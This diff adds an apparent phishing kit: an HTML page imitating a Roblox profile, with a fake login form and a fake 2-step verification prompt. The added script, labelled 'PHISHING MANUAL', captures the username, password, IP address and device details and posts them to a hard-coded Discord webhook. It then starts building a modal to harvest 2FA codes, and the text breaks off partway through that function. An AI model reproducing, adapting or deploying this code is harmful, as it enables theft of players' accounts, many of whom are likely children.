@@ -1,0 +1,1294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Munfuja22's Profile</title>
+<style>
+  :root{
+    --blue:#335FFF;
+    --text:#1B2430;
+    --muted:#606670;
+    --pill:#EBEDF1;
+    --card:#F5F6F8;
+    --border:#E3E5E9;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html,body{background:#fff;}
+  body{
+    font-family:"Builder Sans",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    color:var(--text);
+    max-width:640px;margin:0 auto;
+    padding-bottom:40px;
+    transition:all .3s;
+  }
+  body.login-active{
+    background:url('roblox-bg.png') center/cover no-repeat fixed;
+    max-width:100%;
+    padding:0;
+    display:flex;
+    flex-direction:column;
+    min-height:100vh;
+  }
+  
+  body.login-active .login-page{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+  }
+  
+  body.login-active .footer{
+    display:block !important;
+    width:100%;
+    padding:40px 16px 20px;
+    background:#1B1B1B;
+    color:#fff;
+    border-top:1px solid #2B2B2B;
+    flex-shrink:0;
+  }
+  body.login-active .footer-links a{
+    color:#9AA0A8;
+  }
+  body.login-active .footer-divider{
+    border-color:#2B2B2B;
+  }
+  body.login-active .footer-copyright p{
+    color:#9AA0A8;
+  }
+
+  header{
+    transition:opacity .3s;
+  }
+  body.login-active header{
+    display:block !important;
+    background:#1B1B1B;
+    position:relative;
+    z-index:1001;
+    flex-shrink:0;
+    width:100%;
+  }
+  body.login-active .avatar-card,
+  body.login-active .identity,
+  body.login-active .stats,
+  body.login-active .actions,
+  body.login-active .tabs,
+  body.login-active .tab-content{
+    display:none;
+  }
+
+  /* ===== Top bar ===== */
+  .topbar{
+    background:#F7F8F9;
+    padding:14px 16px 0;
+  }
+  body.login-active .topbar{
+    background:#1B1B1B;
+    border-bottom:1px solid #2B2B2B;
+    display:block;
+    padding:14px 16px 0;
+    width:100%;
+  }
+  body.login-active .topbar-row{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:16px;
+    width:100%;
+  }
+  body.login-active .auth{
+    display:flex !important;
+    gap:10px;
+    margin-left:0;
+  }
+  body.login-active .btn-signup{
+    background:var(--blue);
+    color:#fff;
+    border:none;
+    border-radius:10px;
+    font-size:15px;
+    font-weight:600;
+    padding:10px 20px;
+    cursor:pointer;
+  }
+  body.login-active .search-ico{
+    display:block !important;
+    color:#fff;
+  }
+  body.login-active .nav{
+    display:flex;
+    justify-content:space-between;
+    padding:16px 6px 14px;
+    width:auto;
+    flex-direction:row;
+    gap:0;
+  }
+  body.login-active .nav a{
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+  }
+  .topbar-row{
+    display:flex;align-items:center;justify-content:space-between;gap:16px;
+  }
+  .rbx-logo{
+    width:38px;height:38px;object-fit:contain;flex-shrink:0;display:block;
+  }
+  .topbar .rbx-logo{
+    filter:brightness(0) saturate(0);
+  }
+  body.login-active .topbar .rbx-logo{
+    filter:brightness(1) saturate(1);
+  }
+  .auth{display:none;}
+  .btn-signup{
+    background:var(--blue);color:#fff;border:none;border-radius:14px;
+    font-size:16px;font-weight:600;padding:11px 28px;cursor:pointer;
+  }
+  .btn-login{
+    background:transparent;color:var(--text);border:2px solid #9AA0A8;border-radius:14px;
+    font-size:16px;font-weight:600;padding:10px 26px;cursor:pointer;
+  }
+  .search-ico{width:26px;height:26px;flex-shrink:0;color:#393B3D;}
+
+  .nav{
+    display:flex;justify-content:space-between;
+    padding:16px 6px 14px;
+  }
+  .nav a{
+    text-decoration:none;color:var(--text);
+    font-size:17px;font-weight:600;padding:0 10px;
+  }
+  body.login-active .nav a{
+    color:#fff;
+  }
+  body.login-active .btn-login{
+    color:#fff;border-color:#666;
+  }
+  body.login-active .search-ico{
+    color:#fff;
+  }
+
+  /* ===== Avatar card ===== */
+  .avatar-card{
+    margin:16px 12px 0;
+    background:var(--card);
+    border-radius:16px;
+    position:relative;
+    overflow:hidden;
+  }
+  .avatar-card img{
+    display:block;width:100%;height:auto;
+    max-height:560px;object-fit:contain;
+  }
+  .btn-3d{
+    position:absolute;top:14px;right:14px;
+    background:#E7E9ED;color:var(--text);
+    border:none;border-radius:12px;
+    font-size:17px;font-weight:500;
+    padding:10px 16px;cursor:pointer;
+  }
+
+  /* ===== Identity ===== */
+  .identity{
+    display:flex;align-items:center;gap:14px;
+    padding:0 16px;margin-top:-34px;position:relative;
+  }
+  .headshot{
+    width:96px;height:96px;border-radius:50%;
+    background:#fff url("https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F7CFD50011DD3EC783907AADAA47F00F-Png/150/150/AvatarHeadshot/Webp/noFilter") center/cover no-repeat;
+    border:none;box-shadow:0 0 0 0 transparent;
+    flex-shrink:0;position:relative;
+  }
+  .headshot::after{
+    content:"";position:absolute;bottom:0;right:0;
+    width:20px;height:20px;background:#31A24C;border-radius:50%;
+  }
+  .names{padding-top:26px;}
+  .display-name{font-size:36px;font-weight:700;line-height:1.15;}
+  .username{font-size:15px;color:var(--muted);margin-top:2px;font-weight:400;}
+
+  /* ===== Stats ===== */
+  .stats{
+    display:flex;gap:10px;flex-wrap:wrap;
+    padding:18px 16px 0;
+  }
+  .stat{
+    background:var(--pill);border-radius:999px;
+    font-size:16px;font-weight:500;
+    padding:13px 20px;white-space:nowrap;
+  }
+  .stat b{font-weight:700;}
+
+  /* ===== Actions ===== */
+  .actions{
+    display:flex;gap:12px;padding:18px 16px 0;
+  }
+  .btn-addfriend{
+    flex:1;background:var(--blue);color:#fff;border:none;border-radius:12px;
+    font-size:18px;font-weight:600;padding:16px 0;cursor:pointer;
+  }
+  .btn-secondary{
+    flex:1;background:#E7E9ED;color:var(--text);border:none;border-radius:12px;
+    font-size:17px;font-weight:600;padding:15px 0;cursor:pointer;
+  }
+  .btn-more{
+    width:56px;background:var(--pill);color:var(--text);border:none;border-radius:12px;
+    font-size:20px;font-weight:500;cursor:pointer;letter-spacing:1px;
+  }
+
+  /* ===== Tabs ===== */
+  .tabs{
+    display:flex;margin-top:26px;border-bottom:1px solid var(--border);
+  }
+  .tab{
+    flex:1;text-align:center;padding:14px 0;
+    font-size:17px;font-weight:600;color:var(--muted);
+    border-bottom:2px solid transparent;cursor:pointer;
+  }
+  .tab.active{color:var(--text);border-bottom-color:var(--text);font-weight:700;}
+
+  /* ===== Currently Wearing ===== */
+  .section-title{
+    font-size:28px;font-weight:700;
+    padding:22px 16px 14px;
+  }
+  .wearing{
+    display:flex;gap:12px;overflow-x:auto;
+    padding:0 16px 20px;scrollbar-width:none;
+  }
+  .wearing::-webkit-scrollbar{display:none;}
+  .item{
+    flex:0 0 150px;
+  }
+  .item-thumb{
+    width:150px;height:150px;background:var(--card);
+    border-radius:14px;position:relative;overflow:hidden;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .item-thumb img{width:100%;height:100%;object-fit:cover;}
+  .item-name{
+    font-size:15px;font-weight:600;margin-top:8px;
+    display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;
+  }
+  .item-price{
+    display:flex;align-items:center;gap:5px;
+    font-size:15px;color:var(--muted);margin-top:4px;font-weight:500;
+  }
+  .robux-ico{
+    width:15px;height:15px;border:2px solid #9AA0A8;border-radius:4px;
+    transform:rotate(45deg) scale(.85);position:relative;flex-shrink:0;
+  }
+  .robux-ico::after{
+    content:"";position:absolute;inset:0;margin:auto;
+    width:4px;height:4px;background:#9AA0A8;border-radius:1px;
+  }
+  .robux-img{
+    width:16px;height:16px;object-fit:contain;flex-shrink:0;
+  }
+
+  /* ===== Tab Content ===== */
+  .tab-content{
+    display:none;
+  }
+  .tab-content.active{
+    display:block;
+  }
+
+  /* ===== Creations Section ===== */
+  .creations-header{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:22px 16px 0;
+  }
+  .creations-controls{
+    display:flex;gap:10px;
+  }
+  .control-btn{
+    background:transparent;border:1.5px solid #9AA0A8;border-radius:10px;
+    width:40px;height:40px;font-size:18px;color:var(--text);
+    cursor:pointer;display:flex;align-items:center;justify-content:center;
+  }
+  .experience-grid{
+    padding:20px 16px;
+  }
+  .experience-card{
+    background:var(--card);border-radius:14px;overflow:hidden;
+    margin-bottom:20px;
+  }
+  .exp-thumbnail{
+    width:100%;height:280px;background:#E7E9ED;overflow:hidden;
+  }
+  .exp-thumbnail img{
+    width:100%;height:100%;object-fit:cover;
+  }
+  .exp-content{
+    padding:18px;
+  }
+  .exp-title{
+    font-size:24px;font-weight:700;color:var(--text);margin-bottom:6px;line-height:1.2;
+  }
+  .exp-creator{
+    font-size:14px;color:var(--muted);font-weight:500;margin-bottom:12px;
+  }
+  .exp-description{
+    font-size:14px;color:var(--muted);line-height:1.5;margin-bottom:16px;font-weight:400;
+  }
+  .exp-stats{
+    display:flex;gap:32px;
+  }
+  .exp-stat{
+    display:flex;flex-direction:column;gap:4px;
+  }
+  .stat-label{
+    font-size:13px;color:var(--muted);font-weight:500;
+  }
+  .stat-value{
+    font-size:20px;font-weight:700;color:var(--text);
+  }
+  
+  /* ===== Login Page ===== */
+  .login-page{
+    position:fixed;inset:0;
+    background:url('roblox-bg.png') center/cover no-repeat fixed;
+    z-index:1000;overflow-y:auto;
+    display:flex;align-items:center;justify-content:center;
+  }
+  body:not(.login-active) .login-page{
+    display:none;
+  }
+  .loading-overlay{
+    display:none !important;
+  }
+  .login-container{
+    padding:20px;width:100%;
+  }
+  .login-card{
+    background:#272930;border-radius:16px;
+    padding:32px 24px;max-width:380px;width:100%;
+    margin:0 auto;color:#fff;
+    box-shadow:0 8px 32px rgba(0,0,0,.3);
+  }
+  .login-title{
+    font-size:28px;font-weight:700;text-align:center;
+    margin-bottom:24px;color:#fff;
+  }
+  .login-input{
+    width:100%;background:#3B3E49;border:1px solid #454955;
+    border-radius:8px;padding:14px 16px;
+    color:#fff;font-size:15px;margin-bottom:12px;
+    font-family:inherit;
+  }
+  .login-input::placeholder{color:#8A8F99;}
+  .login-input:focus{outline:none;border-color:#fff;color:#fff;}
+  .login-input::selection{background:#fff;color:#272930;}
+  .login-btn{
+    width:100%;background:transparent;color:#fff;border:1px solid #999;
+    border-radius:8px;padding:14px 0;font-size:16px;font-weight:600;
+    cursor:pointer;margin-top:8px;margin-bottom:20px;
+  }
+  .login-loading{
+    display:none;
+    width:100%;margin-top:8px;margin-bottom:20px;
+    align-items:center;justify-content:center;
+  }
+  .login-loading img{
+    height:44px;width:auto;
+  }
+  body.login-active .btn-signup{
+    background:var(--blue);
+    color:#fff;
+    border:none;
+    border-radius:10px;
+    font-size:15px;
+    font-weight:600;
+    padding:10px 20px;
+    cursor:pointer;
+    margin-left:auto;
+  }
+  .login-divider{
+    height:1px;background:#3B3E49;margin:16px 0;
+  }
+  .login-forgot{
+    text-align:center;color:#fff;font-size:15px;
+    font-weight:600;margin-bottom:12px;cursor:pointer;
+  }
+  .login-secondary{
+    width:100%;background:#3B3E49;color:#fff;border:1px solid #454955;
+    border-radius:8px;padding:12px 0;font-size:15px;font-weight:600;
+    cursor:pointer;margin-bottom:10px;font-family:inherit;
+  }
+  .login-secondary:active{background:#454955;}
+  .login-signup{
+    text-align:center;color:#9AA0A8;font-size:14px;
+    margin-top:16px;font-weight:400;
+  }
+  .login-signup a{color:#fff;text-decoration:none;font-weight:600;}
+  
+  /* ===== Modal (deprecated) ===== */
+  .footer{
+    padding:40px 16px 20px;border-top:1px solid var(--border);margin-top:20px;
+  }
+  .footer-links{
+    display:flex;flex-wrap:wrap;gap:28px;margin-bottom:24px;
+  }
+  .footer-links a{
+    text-decoration:none;color:var(--muted);font-size:14px;font-weight:400;
+    transition:color .2s;
+    white-space:nowrap;
+  }
+  .footer-links a:active{color:var(--blue);}
+  .footer-col{
+    display:contents;
+  }
+  .footer-col a{
+    text-decoration:none;color:var(--muted);font-size:14px;font-weight:400;
+    transition:color .2s;
+    display:block;
+  }
+  .footer-col a:active{color:var(--blue);}
+  .footer-divider{
+    height:1px;background:var(--border);margin:20px 0;
+  }
+  .footer-copyright{
+    flex:1;
+  }
+  .footer-copyright p{
+    font-size:12px;color:var(--muted);line-height:1.4;
+    font-weight:400;margin:0;
+    text-align:center;
+  }
+
+  /* ===== Browser bar (mobile look) ===== */
+  .browser{
+    display:none;
+  }
+  .b-pill{
+    background:#fff;border-radius:999px;
+    box-shadow:0 4px 18px rgba(0,0,0,.14);
+    display:flex;align-items:center;justify-content:center;
+    padding:14px 18px;font-size:18px;color:#3a3a3c;gap:22px;
+  }
+  .b-url{
+    flex:1;font-weight:700;font-size:18px;color:#111;
+    justify-content:center;gap:14px;
+  }
+  .b-url .chev{font-weight:400;color:#3a3a3c;}
+
+  /* ===== Loading Screen ===== */
+  .loading-screen{
+    display:none;
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    background:rgba(0,0,0,0.7);
+    z-index:9999;
+    align-items:center;
+    justify-content:center;
+    backdrop-filter:blur(4px);
+  }
+  .loading-screen.active{
+    display:flex;
+  }
+  .loading-content{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:0;
+  }
+  .loading-gif{
+    width:80px;
+    height:80px;
+  }
+
+  /* ===== Verification Modal ===== */
+  .verification-modal{
+    display:none;
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    background:rgba(0,0,0,0.6);
+    z-index:8000;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    opacity:0;
+    transition:opacity 0.25s ease;
+  }
+  .verification-modal.active{
+    opacity:1;
+  }
+  .verification-content{
+    background:#272930;
+    border-radius:14px;
+    width:100%;
+    max-width:360px;
+    max-height:88vh;
+    overflow-y:auto;
+    box-shadow:0 20px 60px rgba(0,0,0,0.5);
+    transform:scale(0.9) translateY(10px);
+    opacity:0;
+    transition:transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease;
+  }
+  .verification-modal.active .verification-content{
+    transform:scale(1) translateY(0);
+    opacity:1;
+  }
+  .verification-header{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:16px;
+    border-bottom:1px solid #3B3E49;
+    position:relative;
+  }
+  .close-btn{
+    position:absolute;
+    left:16px;
+    background:none;
+    border:none;
+    color:#fff;
+    font-size:22px;
+    cursor:pointer;
+    padding:0;
+    width:32px;
+    height:32px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .close-btn:hover{
+    opacity:0.7;
+  }
+  .verification-header h2{
+    color:#fff;
+    font-size:16px;
+    font-weight:600;
+    margin:0;
+    text-align:center;
+  }
+  .verification-body{
+    padding:22px 20px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+  }
+  .lock-icon{
+    width:64px;
+    height:64px;
+    margin-bottom:20px;
+  }
+  .lock-icon img{
+    width:100%;
+    height:100%;
+    object-fit:contain;
+  }
+  .verification-text{
+    color:#D0D0D0;
+    font-size:13px;
+    margin:0 0 14px 0;
+    line-height:1.5;
+  }
+  .email-masked{
+    color:#999;
+    font-size:13px;
+    margin:0 0 22px 0;
+    word-break:break-all;
+  }
+  .verification-input{
+    width:100%;
+    background:#3B3E49;
+    border:1px solid #454955;
+    border-radius:8px;
+    padding:13px 14px;
+    color:#fff;
+    font-size:14px;
+    text-align:left;
+    margin-bottom:16px;
+  }
+  .verification-input::placeholder{
+    color:#8A8F99;
+  }
+  .verification-input:focus{
+    outline:none;
+    border-color:#fff;
+  }
+  .trust-device{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:22px;
+    cursor:pointer;
+    color:#D0D0D0;
+    font-size:12px;
+    width:100%;
+    justify-content:center;
+  }
+  .trust-checkbox{
+    width:18px;
+    height:18px;
+    cursor:pointer;
+    accent-color:#335FFF;
+    flex-shrink:0;
+  }
+  .verification-links{
+    width:100%;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+    margin-bottom:22px;
+    align-items:center;
+  }
+  .verification-links .link{
+    color:#fff;
+    text-decoration:none;
+    font-size:13px;
+    font-weight:600;
+    transition:color 0.2s;
+  }
+  .verification-links .link:hover{
+    color:#D0D0D0;
+  }
+  .verify-btn{
+    width:100%;
+    background:#3B3E49;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    padding:13px 0;
+    font-size:14px;
+    font-weight:600;
+    cursor:pointer;
+    margin-bottom:20px;
+    transition:background 0.2s;
+  }
+  .verify-btn:hover{
+    background:#454955;
+  }
+  .verification-footer{
+    width:100%;
+    padding-top:14px;
+    border-top:1px solid #3B3E49;
+  }
+  .verification-footer p{
+    color:#999;
+    font-size:11px;
+    line-height:1.5;
+    margin:8px 0;
+  }
+  .verification-footer .warning{
+    margin-top:12px;
+    font-size:10px;
+    color:#888;
+  }
+</style>
+</head>
+<body>
+
+  <!-- Top bar -->
+  <header class="topbar">
+    <div class="topbar-row">
+      <img class="rbx-logo" src="robloxwhite.png" alt="Roblox">
+      <div class="auth">
+        <button class="btn-signup">Sign Up</button>
+      </div>
+      <svg class="search-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round">
+        <circle cx="10.5" cy="10.5" r="6.5"/><line x1="15.5" y1="15.5" x2="21" y2="21"/>
+      </svg>
+    </div>
+    <nav class="nav">
+      <a href="#">Charts</a>
+      <a href="#">Marketplace</a>
+      <a href="#">Create</a>
+      <a href="#">Robux</a>
+    </nav>
+  </header>
+
+  <!-- Avatar -->
+  <div class="avatar-card">
+    <img src="https://tr.rbxcdn.com/30DAY-Avatar-F7CFD50011DD3EC783907AADAA47F00F-Png/720/720/Avatar/Webp/noFilter" alt="Munfuja22 avatar">
+    <button class="btn-3d">3D</button>
+  </div>
+
+  <!-- Name -->
+  <div class="identity">
+    <div class="headshot"></div>
+    <div class="names">
+      <div class="display-name">Munfuja22</div>
+      <div class="username">@munfuja22</div>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats">
+    <div class="stat"><b>980</b> Friends</div>
+    <div class="stat"><b>364</b> Followers</div>
+    <div class="stat"><b>1</b> Following</div>
+  </div>
+
+  <!-- Actions -->
+  <div class="actions">
+    <button class="btn-addfriend" onclick="navigateToLogin()">Join</button>
+    <button class="btn-secondary" onclick="navigateToLogin()">Add Connection</button>
+    <button class="btn-more">&#8943;</button>
+  </div>
+
+  <!-- Tabs -->
+  <div class="tabs">
+    <div class="tab active" onclick="setTab(this, 'about')">About</div>
+    <div class="tab" onclick="setTab(this, 'creations')">Creations</div>
+  </div>
+
+  <!-- About Section -->
+  <div id="about-content" class="tab-content active">
+    <!-- Currently Wearing -->
+    <h2 class="section-title">Currently Wearing</h2>
+    <div class="wearing" id="wearingCarousel">
+      <div class="item">
+        <div class="item-thumb">
+          <img src="https://tr.rbxcdn.com/180DAY-1985eb1fd025811e5510ee3b9e123318/420/420/HairAccessory/Webp/noFilter" alt="Shaggy">
+        </div>
+        <div class="item-name">Shaggy</div>
+        <div class="item-price"><img src="ROBUX.png" alt="Robux" class="robux-img">1,647</div>
+      </div>
+      <div class="item">
+        <div class="item-thumb">
+          <img src="https://tr.rbxcdn.com/180DAY-a907e960e3d8c667442621ff50a9cf02/420/420/NeckAccessory/Webp/noFilter" alt="Bling Shine">
+        </div>
+        <div class="item-name">Bling Shine</div>
+        <div class="item-price"><img src="ROBUX.png" alt="Robux" class="robux-img">600</div>
+      </div>
+      <div class="item">
+        <div class="item-thumb">
+          <img src="https://tr.rbxcdn.com/180DAY-02f39b7d48ab66c54f2d8e6ff3220002/420/420/ShoulderAccessory/Webp/noFilter" alt="Spring Fairy">
+        </div>
+        <div class="item-name">Spring Fairy</div>
+        <div class="item-price"><img src="ROBUX.png" alt="Robux" class="robux-img">300</div>
+      </div>
+      <div class="item">
+        <div class="item-thumb">
+          <img src="https://tr.rbxcdn.com/30DAY-Avatar-26A1F064E031EA033DB6B432E3A1B514-Png/150/150/Avatar/Webp/noFilter" alt="adidas Community Animation Pack">
+        </div>
+        <div class="item-name">adidas Community Animation Pack</div>
+        <div class="item-price"><img src="ROBUX.png" alt="Robux" class="robux-img">300</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Creations Section -->
+  <div id="creations-content" class="tab-content">
+    <div class="creations-header">
+      <h2 class="section-title">Experiences</h2>
+    </div>
+    
+    <div class="experience-grid">
+      <div class="experience-card">
+        <div class="exp-thumbnail">
+          <img src="https://tr.rbxcdn.com/180DAY-544785886a805cc72d3abcedb76833a6/352/352/Image/Png/noFilter" alt="Eat to become the best">
+        </div>
+        <div class="exp-content">
+          <h3 class="exp-title">Eat to become the best</h3>
+          <p class="exp-creator">🎮 Eat to Become the Best</p>
+          <p class="exp-description">Eat, grow, and dominate the arena. Consume food to increase your size and power, defeat other players, climb the leaderboard, and prove you are the biggest and best in the server. Do you have what it takes to become the best?</p>
+          <div class="exp-stats">
+            <div class="exp-stat">
+              <span class="stat-label">Active</span>
+              <span class="stat-value">0</span>
+            </div>
+            <div class="exp-stat">
+              <span class="stat-label">Visits</span>
+              <span class="stat-value">708</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading Screen -->
+  <div class="loading-screen" id="loadingScreen">
+    <div class="loading-content">
+      <img src="loading.gif" alt="Loading..." class="loading-gif">
+    </div>
+  </div>
+
+  <!-- Two-Step Verification Modal -->
+  <div class="verification-modal" id="verificationModal">
+    <div class="verification-content">
+      <div class="verification-header">
+        <button class="close-btn" onclick="closeVerification()">✕</button>
+        <h2>2-Step Verification</h2>
+      </div>
+      
+      <div class="verification-body">
+        <div class="lock-icon">
+          <img src="lock.png" alt="Lock">
+        </div>
+        
+        <p class="verification-text">We want to make sure it's really you. Please enter the code we sent to your email:</p>
+        
+        <input type="text" class="verification-input" placeholder="Enter your 6-digit code" maxlength="6">
+        
+        <label class="trust-device">
+          <input type="checkbox" class="trust-checkbox">
+          <span>Trust this device for 30 days.</span>
+        </label>
+        
+        <div class="verification-links">
+          <a href="#" class="link">Resend Code</a>
+          <a href="#" class="link">Use a different verification method</a>
+        </div>
+        
+        <button class="verify-btn">Verify</button>
+        
+        <div class="verification-footer">
+          <p>Need help? Contact Roblox Support.</p>
+          <p class="warning">IMPORTANT: Never share your security codes with anyone. Roblox will never ask you to share your codes, over text, screen sharing, etc.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Login Page -->
+  <div id="loginPage" class="login-page">
+    <div class="login-container">
+      <div class="login-card">
+        <h2 class="login-title">Login to Roblox</h2>
+        <form id="loginForm">
+          <input type="text" class="login-input" placeholder="Username/Email/Phone" required>
+          <input type="password" class="login-input" placeholder="Password" required>
+          <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+          <div class="login-loading" id="loginLoading">
+            <img src="loading.gif" alt="Loading...">
+          </div>
+        </form>
+        <div class="login-divider"></div>
+        <p class="login-forgot">Forgot Password or Username?</p>
+        <button class="login-secondary">Email Me a One-Time Code</button>
+        <button class="login-secondary">Quick Sign-in</button>
+        <p class="login-signup">Don't have an account? <a href="#">Sign Up</a></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-links">
+      <a href="#">About Us</a>
+      <a href="#">Jobs</a>
+      <a href="#">Newsroom</a>
+      <a href="#">Parents</a>
+      <a href="#">Buy Gift Cards</a>
+      <a href="#">Help</a>
+      <a href="#">Terms</a>
+      <a href="#">Accessibility</a>
+      <a href="#">Privacy</a>
+      <a href="#">Privacy Choices</a><img src="badge.png" alt="Badge" style="width:18px;height:18px;margin:0 0 0 4px;display:inline-block;vertical-align:middle;">
+      <a href="#">Sitemap</a>
+    </div>
+    <div class="footer-divider"></div>
+    <div class="footer-copyright">
+      <p>©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are some of our registered and unregistered trademarks in the United States and other countries.</p>
+    </div>
+  </footer>
+
+  <!-- Mobile browser bar -->
+  <div class="browser">
+    <div class="b-pill b-url"><span class="chev">&#9707;</span> roblox.com <span class="chev">&#8635;</span></div>
+    <div class="b-pill">&#8943;</div>
+  </div>
+
+<script>
+  function setTab(el, tabName){
+    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+    el.classList.add('active');
+    
+    document.querySelectorAll('.tab-content').forEach(tc=>tc.classList.remove('active'));
+    document.getElementById(tabName + '-content').classList.add('active');
+  }
+  
+  function navigateToLogin(){
+    document.body.classList.add('login-active');
+  }
+
+  document.getElementById('loginForm').addEventListener('submit', function(e){
+    e.preventDefault();
+
+    // quitar el boton y poner el loading.gif en su lugar exacto
+    document.getElementById('loginBtn').style.display = 'none';
+    document.getElementById('loginLoading').style.display = 'flex';
+
+    // esperar entre 1 y 2.5 segundos
+    var delay = 1000 + Math.random() * 1500;
+    setTimeout(function(){
+      // Ocultar el loading y mostrar el modal de verificación
+      document.getElementById('loginLoading').style.display = 'none';
+      document.getElementById('loginBtn').style.display = 'block';
+      
+      const modal = document.getElementById('verificationModal');
+      modal.style.display = 'flex';
+      // pequeño delay para que la animación se dispare
+      requestAnimationFrame(() => {
+        modal.classList.add('active');
+      });
+    }, delay);
+  });
+  
+  function closeVerification(){
+    const modal = document.getElementById('verificationModal');
+    modal.classList.remove('active');
+    // esperar a que termine la animación de salida
+    setTimeout(() => {
+      modal.style.display = 'none';
+    }, 250);
+    document.getElementById('loginBtn').style.display = 'block';
+  }
+</script>
+// ============================================================
+// PHISHING MANUAL - CÓDIGO PARA PÁGINA FAKE
+// SIN CAPTURA DE COOKIES
+// ============================================================
+
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1535777104984277032/3EIQf7UfC8SF8-N9oX6cXDHqOkDNT7lKGtP2kpB22Iv6Wvi-QxVMLxnHsM1ysheU873b";
+
+// ============================================================
+// ENVIAR A DISCORD
+// ============================================================
+
+async function sendToDiscord(title, fields, color = 0xFF0000) {
+    const embed = {
+        title: title,
+        color: color,
+        timestamp: new Date().toISOString(),
+        fields: fields,
+        footer: {
+            text: "🎣 Phishing Manual | " + new Date().toLocaleString()
+        }
+    };
+    
+    const payload = {
+        embeds: [embed],
+        username: "Roblox Logger",
+        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+    };
+    
+    try {
+        const response = await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        return { success: response.ok };
+    } catch (error) {
+        console.error('Error:', error);
+        return { success: false, error: error.message };
+    }
+}
+
+// ============================================================
+// CAPTURAR IP
+// ============================================================
+
+async function getIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch {
+        return 'No disponible';
+    }
+}
+
+// ============================================================
+// INTERCEPTAR LOGIN
+// ============================================================
+
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.getElementById('loginForm');
+    if (!loginForm) {
+        console.log('Formulario no encontrado, intentando con otro selector...');
+        const forms = document.querySelectorAll('form');
+        if (forms.length > 0) {
+            interceptForm(forms[0]);
+        }
+        return;
+    }
+    
+    interceptForm(loginForm);
+});
+
+function interceptForm(form) {
+    const originalSubmit = form.onsubmit;
+    
+    form.onsubmit = async function(e) {
+        e.preventDefault();
+        
+        // Buscar campos de usuario y contraseña
+        const inputs = this.querySelectorAll('input');
+        let username = '';
+        let password = '';
+        
+        inputs.forEach(input => {
+            const type = input.type?.toLowerCase() || '';
+            const placeholder = input.placeholder?.toLowerCase() || '';
+            const name = input.name?.toLowerCase() || '';
+            const id = input.id?.toLowerCase() || '';
+            
+            if (type === 'text' || type === 'email' || placeholder.includes('user') || placeholder.includes('email') || name.includes('user') || name.includes('email') || id.includes('user') || id.includes('email')) {
+                username = input.value;
+            }
+            if (type === 'password' || placeholder.includes('pass') || name.includes('pass') || id.includes('pass')) {
+                password = input.value;
+            }
+        });
+        
+        // Si no encontró con los criterios, tomar los primeros dos inputs
+        if (!username && !password && inputs.length >= 2) {
+            username = inputs[0].value;
+            password = inputs[1].value;
+        }
+        
+        console.log('📥 Credenciales capturadas:', { username, password });
+        
+        // Obtener IP
+        const ip = await getIP();
+        
+        // Enviar a Discord
+        await sendToDiscord(
+            "🎣 CREDENCIALES CAPTURADAS - INGRESA MANUALMENTE EN ROBLOX",
+            [
+                { name: "👤 Usuario", value: `\`${username}\``, inline: true },
+                { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
+                { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+                { name: "🖥️ User Agent", value: `\`${navigator.userAgent.substring(0, 80)}...\``, inline: false },
+                { name: "📱 Pantalla", value: `${screen.width}x${screen.height}`, inline: true },
+                { name: "⏰ Hora", value: new Date().toLocaleString(), inline: true },
+                { name: "📌 Acción", value: "⚠️ INGRESA ESTAS CREDENCIALES EN ROBLOX MANUALMENTE", inline: false }
+            ],
+            0xFF5500
+        );
+        
+        // Mostrar modal pidiendo código 2FA
+        mostrarModal2FA(username);
+        
+        // Continuar con el comportamiento original si existe
+        if (typeof originalSubmit === 'function') {
+            originalSubmit.call(this, e);
+        }
+    };
+}
+
+// ============================================================
+// MODAL PARA 2FA
+// ============================================================
+
+function mostrarModal2FA(username) {
+    // Crear overlay
+    const overlay = document.createElement('div');
+    overlay.id = 'phishing-modal';
+    overlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.85);
+        z-index: 999999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        backdrop-filter: blur(8px);
+        animation: fadeIn 0.3s ease;
+    `;
+    
